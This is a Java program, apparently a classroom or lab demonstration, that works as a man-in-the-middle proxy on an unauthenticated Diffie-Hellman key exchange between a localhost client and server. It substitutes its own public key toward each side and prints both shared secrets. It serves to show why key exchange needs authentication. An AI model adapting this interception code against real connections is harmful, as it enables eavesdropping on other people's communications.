import java.net.*;
import java.io.*;
import java.math.BigInteger;
import java.security.SecureRandom;

public class MITM {
    private static final int BIT_LENGTH = 512; // Bit length for private keys

    public static void main(String[] args) {
        try (ServerSocket attackerServerSocket = new ServerSocket(6000)) {
            System.out.println("MITM Proxy is now listening on port 6000...");

            // Connect to the actual server
            Socket serverSocket = new Socket("localhost", 5000);
            DataInputStream serverInput = new DataInputStream(serverSocket.getInputStream());
            DataOutputStream serverOutput = new DataOutputStream(serverSocket.getOutputStream());

            // Wait for a connection from the client
            Socket clientSocket = attackerServerSocket.accept();
            System.out.println("Client connected to the MITM Proxy.");
            DataInputStream clientInput = new DataInputStream(clientSocket.getInputStream());
            DataOutputStream clientOutput = new DataOutputStream(clientSocket.getOutputStream());

            // Intercept server's public parameters and public key
            BigInteger p = new BigInteger(serverInput.readUTF());
            BigInteger g = new BigInteger(serverInput.readUTF());
            BigInteger serverPublicKey = new BigInteger(serverInput.readUTF());
            System.out.println("Intercepted server's public parameters: p = " + p + ", g = " + g);
            System.out.println("Intercepted server's public key: " + serverPublicKey);

            // Generate MITM's private key and public key
            SecureRandom random = new SecureRandom();
            BigInteger attackerPrivateKey = new BigInteger(BIT_LENGTH, random);
            BigInteger attackerPublicKey = g.modPow(attackerPrivateKey, p);
            System.out.println("MITM Proxy's private key generated: " + attackerPrivateKey);
            System.out.println("MITM Proxy's public key generated: " + attackerPublicKey);

            // Send MITM's public key to the client (pretending to be the server)
            clientOutput.writeUTF(p.toString());
            clientOutput.writeUTF(g.toString());
            clientOutput.writeUTF(attackerPublicKey.toString());
            System.out.println("MITM Proxy sent its public key to the client.");

            // Intercept client's public key
            BigInteger clientPublicKey = new BigInteger(clientInput.readUTF());
            System.out.println("Intercepted client's public key: " + clientPublicKey);

            // Send MITM's public key to the server (pretending to be the client)
            serverOutput.writeUTF(attackerPublicKey.toString());
            System.out.println("MITM Proxy sent its public key to the server.");

            // Compute shared secrets
            BigInteger sharedSecretWithServer = serverPublicKey.modPow(attackerPrivateKey, p);
            BigInteger sharedSecretWithClient = clientPublicKey.modPow(attackerPrivateKey, p);
            System.out.println("Shared secret with server: " + sharedSecretWithServer);
            System.out.println("Shared secret with client: " + sharedSecretWithClient);

            // At this point, the MITM Proxy has successfully intercepted and can decrypt messages
            // between the server and client using the shared secrets.

            // Close sockets
            clientSocket.close();
            serverSocket.close();
            System.out.println("MITM Proxy connection closed.");

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
